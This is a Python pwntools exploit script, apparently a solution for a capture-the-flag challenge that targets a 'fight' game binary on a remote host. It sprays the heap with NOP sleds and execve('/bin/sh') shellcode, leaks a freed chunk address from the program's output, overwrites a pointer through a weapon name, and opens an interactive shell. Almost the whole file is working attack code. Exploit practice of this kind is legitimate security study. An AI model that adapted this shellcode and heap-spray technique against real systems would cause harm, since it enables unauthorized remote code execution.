
from pwn import *


HOST = 'ncsc.ccis.no'
PORT = 7070

free = []

debug = True
debug = False
if debug:
    r = process('./fight')
    gdb.attach(r)
else:
    r = remote(HOST, PORT)

def mm():
    r.recvuntil('What do you want to do? (1: load weaponry, 2: add new player, 3: fight, 4: quit)')

def addWeapon(low, high, name):
    r.sendline('1')
    print r.recvline()
    r.sendline("{} {} {}".format(low, high, name))
    r.sendline("")
    mm()

def addPlayer(name, punchline, style=1):
    r.sendline('2')
    tmp = r.recvuntil('max):')

    if "Kicking" in tmp:
        free.append(tmp.split()[6].replace('(','').replace(')',''))

    r.sendline(name)
    print r.recvuntil('max):')
    r.sendline(punchline)
    print r.recvuntil('):')
    r.sendline(str(style))
    mm()

def fight():
    r.sendline('3')
    print r.recvuntil('fought valiantly, nobly, honorably and died.')
    mm()

mm()

addWeapon(10, 11, 'AAAA')
addWeapon(11,12, 'DDDD')

#shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
thingy = "\x90" * (510 - len(shellcode)) + shellcode


for i in range(2000):
    addPlayer("{}".format(i), thingy)


from struct import pack

def p64(x):
    return pack('<L', x)

num = int(free[0], 16) + 8

#addr = p64(int(free[0], 16) + 0x32)
addr = p64(num)

addPlayer("","","")
addWeapon(10, 11, addr)

#print free

#fight()




r.interactive()




